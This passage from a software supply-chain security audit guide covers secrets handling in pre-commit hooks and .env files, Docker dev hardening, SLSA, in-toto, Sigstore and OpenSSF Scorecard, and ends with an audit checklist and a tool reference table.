- Check extension permissions (filesystem access, network access, terminal access)
- Monitor for extensions with suspiciously low download counts or recent creation dates
- Use VS Code's extension runtime security features (restricted mode)
- Pin extension versions where possible
- Disable auto-update for extensions in security-sensitive environments

**Anti-patterns to detect:**
- `.vscode/extensions.json` recommending unverified extensions
- Extensions with `"*"` activation events (activate on every event)
- Extensions requesting unnecessary permissions
- Team-shared extension recommendations without security review

### 7.2 Pre-Commit Hooks Security

Pre-commit hooks serve as a defense layer for catching secrets and quality issues before code reaches the repository.

**Tools for secrets detection:**
- **Gitleaks**: Fast regex-based scanning, ideal for pre-commit (millisecond latency), may have false positives
- **ggshield** (GitGuardian): API-based verification of detected secrets, fewer false positives
- **TruffleHog**: Supports live credential verification, broader detection

**Statistics:** In 2025, 28 million credentials were leaked on GitHub, highlighting the need for automated scanning.

**Pre-commit hook risks:**
- Hooks from untrusted sources can execute arbitrary code
- The `pre-commit` framework downloads and runs code from remote repositories
- Hooks can be bypassed with `git commit --no-verify`

**Audit checks:**
- Verify pre-commit hooks are installed for secrets scanning
- Check that `.pre-commit-config.yaml` pins hook versions (not `main` or `latest`)
- Verify server-side pre-receive hooks exist as a backstop (hooks can be bypassed locally)
- Check CI pipeline includes secrets scanning as a mandatory step
- Validate that hook sources are from trusted repositories

### 7.3 Local Dev Secrets Management

#### .env Files

The `.env` file format provides a single place to store sensitive application secrets during development.

**Core rules:**
- NEVER commit `.env` files to version control
- Always add `.env`, `.env.local`, `.env.*.local` to `.gitignore`
- Use `.env.example` or `.env.template` (without real values) for documenting required variables
- Never put actual secrets in `.env.development` files that get committed

**Encrypted .env files (dotenvx):**
dotenvx uses Elliptic Curve Integrated Encryption Scheme (ECIES) to encrypt secrets:
- `DOTENV_PUBLIC_KEY` for encryption (safe to commit)
- `DOTENV_PRIVATE_KEY` for decryption (stored in secrets manager or `.env.keys`)
- Enables safe "secrets-as-code" workflow

#### direnv

direnv loads/unloads environment variables per-directory using `.envrc` files:
- Variables are scoped to the project directory (unloaded on exit)
- Built-in security: requires explicit approval (`direnv allow`) before executing `.envrc`
- **WARNING**: Approving untrusted `.envrc` files executes arbitrary commands

**Audit checks:**
- Verify `.env` and `.env.local` are in `.gitignore`
- Scan git history for accidentally committed `.env` files
- Check for secrets in `.env.development`, `.env.test`, or other committed env files
- Verify `.envrc` files don't contain inline secrets (should reference external sources)
- Check for `DOTENV_PRIVATE_KEY` or similar decryption keys in committed files
- Verify team has documented which environment variables are required

**Anti-patterns to detect:**
- `.env` file committed to repository (even if later removed -- still in git history)
- Secrets in any committed environment file
- `.envrc` with inline API keys or passwords
- Missing `.env` entries in `.gitignore`
- `.env.keys` files committed to repository (dotenvx decryption keys)

### 7.4 Docker-in-Dev Security

**Audit checks:**
- Verify Docker images use specific version tags, not `latest`
- Check for base images from verified publishers (Docker Official Images, Chainguard)
- Verify Dockerfiles don't copy `.env` files into images
- Check that `docker-compose.yml` doesn't expose unnecessary ports
- Verify development volumes don't mount sensitive host directories
- Check for hardcoded secrets in Dockerfiles or docker-compose files
- Use `.dockerignore` to exclude `.env`, `.git`, `node_modules`, etc.

**Chainguard images:**
- Distroless approach: no shells, package managers, or unnecessary utilities
- Signed by default with verifiable provenance metadata
- Rebuilt nightly with latest security patches
- `-dev` variants available for development with necessary tools

**Anti-patterns to detect:**
- `FROM node:latest` or `FROM python:latest` (unpinned base images)
- `COPY . .` without `.dockerignore` (copies secrets, git history, node_modules)
- `ENV SECRET_KEY=...` in Dockerfile (secrets in image layers)
- `docker run --privileged` in development
- Exposed ports in docker-compose that should be internal-only

**Primary sources:**
- [VS Code Extension Runtime Security](https://code.visualstudio.com/docs/configure/extensions/extension-runtime-security)
- [GitGuardian: Git Hooks for Secrets](https://www.gitguardian.com/glossary/git-hooks)
- [OWASP DevSecOps Guideline: Pre-Commit](https://owasp.org/www-project-devsecops-guideline/latest/01-Pre-commit)
- [GitGuardian: Secure Your Secrets with .env](https://blog.gitguardian.com/secure-your-secrets-with-env/)
- [dotenvx](https://dotenvx.com/)
- [Chainguard Container Security Best Practices](https://www.chainguard.dev/supply-chain-security-101/container-security-best-practices-without-the-toil)
- [Chainguard Academy: Overview](https://edu.chainguard.dev/chainguard/chainguard-images/overview/)
- [Snyk: State of Secrets 2025](https://snyk.io/articles/state-of-secrets/)
- [AWS Well-Architected: Pre-Commit Security Checks](https://docs.aws.amazon.com/wellarchitected/latest/devops-guidance/dl.ld.4-enforce-security-checks-before-commit.html)

---

## 8. SLSA Framework and Software Attestation

### 8.1 SLSA Levels

SLSA (Supply-chain Levels for Software Artifacts) is a framework proposed by Google in 2021 for securing supply chains throughout the software development lifecycle. Current stable release: v1.1 (v1.2 in development).

#### Build Track Levels

| Level | Name | Requirements | What It Prevents |
|-------|------|-------------|------------------|
| L0 | No guarantees | None | Nothing |
| L1 | Provenance exists | Consistent build process; provenance documents build platform, process, and inputs; provenance distributed to consumers | Mistakes, unintentional changes |
| L2 | Hosted build platform | All L1 + dedicated build infrastructure (not developer workstation); provenance tied to infrastructure via digital signature; downstream verification of provenance authenticity | Tampering by insiders with build config access |
| L3 | Hardened builds | All L2 + runs isolated from other builds (even same project); signing secrets inaccessible to user-defined build steps | Sophisticated tampering, compromised build environment |

#### Source Track (Under Development)
The SLSA Source Track specification is in development and will define requirements for source code integrity and provenance.

### 8.2 Provenance Requirements

SLSA provenance describes:
- **Who** built the artifact (build platform identity)
- **What process** they used (build configuration, entry point)
- **What inputs** were used (source repository, commit SHA, dependencies)

**Format:** SLSA provenance uses the [in-toto attestation format](https://github.com/in-toto/attestation) with:
- Signed wrapper using DSSE (Dead Simple Signing Envelope)
- Subject identified by cryptographic digest (the built artifact)
- Typed payload containing the provenance claim

### 8.3 in-toto Attestation Framework

in-toto is a CNCF graduated project (2023) that provides end-to-end supply chain integrity verification.

**Core concepts:**
- **Layouts**: Define the expected steps in a supply chain, who performs them, and what artifacts are expected
- **Link metadata**: Signed records of each step actually performed
- **Verification**: End-to-end validation that all steps happened as intended with no unauthorized modifications

**Predicate types:**
- **SLSA Provenance**: Records how an artifact was built
- **SBOM**: Wraps vulnerability scan results in a signed attestation
- **Custom predicates**: Organizations can define their own claim types

**Integration with SLSA:**
- SLSA provenance attestations use the in-toto attestation format
- SLSA verification extends in-toto's end-to-end verification model
- in-toto provides the technical foundation; SLSA provides the maturity framework

### 8.4 Sigstore

Sigstore provides free, automated cryptographic signing for open source software:

**Components:**
- **Fulcio**: Certificate authority that issues short-lived certificates based on OIDC identity
- **Rekor**: Immutable, tamper-evident transparency log of signing events
- **cosign**: CLI tool for signing and verifying container images and artifacts

**How npm provenance uses Sigstore:**
1. CI build requests OIDC token from CI provider (GitHub Actions)
2. Fulcio issues short-lived signing certificate linked to the OIDC identity
3. Package provenance is signed and recorded in Rekor transparency log
4. Consumers verify provenance with `npm audit signatures`

### 8.5 Audit Checks for SLSA/Attestation Compliance

**For package consumers:**
- Verify provenance attestations on critical dependencies
- Run `npm audit signatures` to validate package provenance
- Use `cosign verify` for container image signatures
- Check that dependency provenance meets at least SLSA L1 (provenance exists)
- Monitor Rekor transparency log for unexpected signing events

**For package producers:**
- Publish packages from CI/CD (not developer workstations) for SLSA L2+
- Use `npm publish --provenance` to generate Sigstore-backed provenance
- Sign container images with cosign: `cosign sign <image>`
- Generate and sign SBOMs as attestations
- Implement isolated, hardened build environments for SLSA L3

**For CI/CD pipeline review:**
- Verify build provenance is generated automatically
- Check that signing keys/certificates are managed by the build platform (not developers)
- Validate that build isolation prevents cross-contamination between builds
- Ensure provenance attestations are published to transparency logs
- Verify consumers can independently verify provenance

**Anti-patterns to detect:**
- Publishing packages from developer workstations (cannot achieve SLSA L2)
- Long-lived signing keys stored as CI secrets (should use Sigstore keyless signing)
- Missing provenance attestations on published packages
- Provenance generated but not distributed to consumers
- Build environments shared between projects without isolation

### 8.6 OpenSSF Scorecard

The OpenSSF Scorecard automatically evaluates security practices across 18+ checks:

| Check | Risk Level | Description |
|-------|-----------|-------------|
| Binary-Artifacts | High | Detects non-reviewable generated executables |
| Branch-Protection | High | Validates protected branches and merge requirements |
| CI-Tests | Low | Confirms automated testing before merges |
| Code-Review | High | Ensures human review before merging |
| Dangerous-Workflow | Critical | Identifies risky GitHub Actions patterns |
| Dependency-Update-Tool | High | Verifies Dependabot/Renovate usage |
| Fuzzing | Medium | Confirms fuzz testing implementation |
| Maintained | High | Assesses active maintenance |
| Pinned-Dependencies | Medium | Verifies locked dependency versions |
| SAST | Medium | Detects static analysis tools |
| SBOM | Medium | Checks for Software Bill of Materials |
| Security-Policy | Medium | Validates vulnerability disclosure process |
| Signed-Releases | High | Confirms cryptographic artifact signing |
| Token-Permissions | High | Validates least-privilege workflow permissions |
| Vulnerabilities | High | Checks for known vulnerabilities |

**Audit integration:**
- Run `scorecard --repo=github.com/org/repo` on all project dependencies
- Flag dependencies with scores below 5 (out of 10) on critical checks
- Prioritize dependencies failing Dangerous-Workflow, Token-Permissions, or Branch-Protection checks

**Primary sources:**
- [SLSA Specification](https://slsa.dev/)
- [SLSA Security Levels](https://slsa.dev/spec/v1.0/levels)
- [SLSA v1.2 Specification](https://slsa.dev/spec/v1.2/)
- [in-toto Attestation Framework](https://github.com/in-toto/attestation)
- [in-toto Project](https://in-toto.io/)
- [SLSA + in-toto Integration](https://slsa.dev/blog/2023/05/in-toto-and-slsa)
- [Sigstore](https://www.sigstore.dev/)
- [npm Provenance Documentation](https://docs.npmjs.com/generating-provenance-statements/)
- [npm + Sigstore (Chainguard)](https://www.chainguard.dev/unchained/npm-sigstore-making-javascript-secure-by-default)
- [Sigstore Blog: npm Provenance GA](https://blog.sigstore.dev/npm-provenance-ga/)
- [OpenSSF Scorecard](https://scorecard.dev/)
- [OpenSSF Scorecard Checks](https://github.com/ossf/scorecard/blob/main/docs/checks.md)
- [OpenSSF Best Practices for Developers](https://best.openssf.org/developers.html)

---

## Appendix A: Quick-Reference Audit Checklist

### Supply Chain
- [ ] All dependencies use scoped names or are verified against typosquatting
- [ ] `.npmrc` has explicit registry routing for private packages
- [ ] Lockfiles are committed and CI uses `npm ci` / `--frozen-lockfile`
- [ ] Lockfile changes in PRs are reviewed as carefully as source code
- [ ] Package provenance is verified (`npm audit signatures`)
- [ ] SBOMs are generated on every build

### Dependencies
- [ ] Dependency versions are pinned (exact or via lockfile)
- [ ] Automated vulnerability scanning runs on every PR/commit
- [ ] Socket.dev or equivalent behavioral analysis is enabled
- [ ] License compliance is checked in CI
- [ ] Dependency update tool (Dependabot/Renovate) is configured

### CI/CD
- [ ] Default workflow permissions set to `contents: read`
- [ ] All third-party actions pinned to full commit SHAs
- [ ] No direct interpolation of `github.event.*` in `run:` steps
- [ ] OIDC used instead of long-lived cloud credentials
- [ ] Self-hosted runners not used for public repos
- [ ] Secrets are not logged, echoed, or passed as CLI arguments
- [ ] `pull_request_target` does not check out PR code

### Framework Configuration
- [ ] Security headers configured (Helmet/CSP/HSTS)
- [ ] CORS restricted to specific trusted origins
- [ ] Rate limiting applied globally and on auth endpoints
- [ ] Input validation on all endpoints (DTOs, pipes, validators)
- [ ] CSRF protection enabled and not disabled
- [ ] Debug mode disabled in production
- [ ] Secrets loaded from environment, not hardcoded

### Build System
- [ ] Source maps not publicly accessible in production
- [ ] No secrets in `VITE_*` or `NEXT_PUBLIC_*` variables
- [ ] `.env` files in `.gitignore`
- [ ] Build environment containerized with pinned versions
- [ ] Build produces reproducible output

### Package Manifest
- [ ] `ignore-scripts=true` in `.npmrc` (or allowlist via @lavamoat/allow-scripts)
- [ ] No auth tokens in committed `.npmrc`
- [ ] `strict-ssl` not set to `false`
- [ ] `.pypirc` not committed to version control

### Dev Environment
- [ ] VS Code extensions reviewed for security
- [ ] Pre-commit hooks installed for secrets scanning
- [ ] `.env` files not committed (verified via git history scan)
- [ ] Docker images use pinned versions from verified publishers
- [ ] `.dockerignore` excludes `.env`, `.git`, `node_modules`

### SLSA / Attestation
- [ ] Packages published from CI/CD (not developer workstations)
- [ ] Provenance attestations generated with Sigstore
- [ ] Container images signed with cosign
- [ ] Build isolation prevents cross-project contamination
- [ ] Critical dependencies meet minimum SLSA level (L1+)

---

## Appendix B: Tool Reference

| Tool | Purpose | Ecosystem |
|------|---------|-----------|
| [Socket.dev](https://socket.dev/) | Malicious package detection | npm, PyPI |
| [npm audit](https://docs.npmjs.com/cli/v11/commands/npm-audit) | Known vulnerability scanning | npm |
| [pip-audit](https://pypi.org/project/pip-audit/) | Known vulnerability scanning | Python |
| [Dependabot](https://github.com/dependabot) | Automated dependency updates | GitHub (30+ ecosystems) |
| [Renovate](https://github.com/renovatebot/renovate) | Automated dependency updates | Multi-platform (90+ ecosystems) |
| [lockfile-lint](https://github.com/lirantal/lockfile-lint) | Lockfile integrity validation | npm, Yarn |
| [@lavamoat/allow-scripts](https://github.com/LavaMoat/LavaMoat) | Lifecycle script allowlisting | npm |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | Secrets detection (pre-commit) | Any |
| [ggshield](https://github.com/GitGuardian/ggshield) | Secrets detection (verified) | Any |
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | Secrets detection (live verification) | Any |
| [cosign](https://github.com/sigstore/cosign) | Container/artifact signing | OCI, any |
| [Scorecard](https://scorecard.dev/) | OSS project security evaluation | GitHub |
| [OWASP Dependency-Track](https://dependencytrack.org/) | SBOM-based vulnerability monitoring | Any |
| [Chainguard Images](https://edu.chainguard.dev/) | Hardened container base images | Docker/OCI |
| [Helmet](https://github.com/helmetjs/helmet) | HTTP security headers | Express.js |
| [dotenvx](https://dotenvx.com/) | Encrypted .env management | Any |
| [direnv](https://direnv.net/) | Per-directory env var management | Any |
